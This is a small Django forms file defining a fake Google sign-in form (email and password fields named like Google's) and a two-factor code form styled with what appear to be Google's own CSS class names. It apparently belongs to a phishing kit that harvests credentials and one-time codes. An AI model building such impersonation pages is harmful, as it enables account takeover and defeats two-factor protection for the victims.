from django import forms

class GoogleLoginForm(forms.Form):
    Email = forms.EmailField(label="",widget=forms.EmailInput(attrs={'placeholder':'Enter your email'}),max_length=50)
    Passwd = forms.CharField(label="",widget=forms.PasswordInput(attrs={'placeholder':'Enter your password'}))

class Google2Factor(forms.Form):
    pin = forms.CharField(label="",widget=forms.NumberInput(attrs={'placeholder':'Enter 6-digit code','type':'tel','pattern':'[0-9]*','class':'Xxfqnf Mj2P6d','dir':'ltr'}))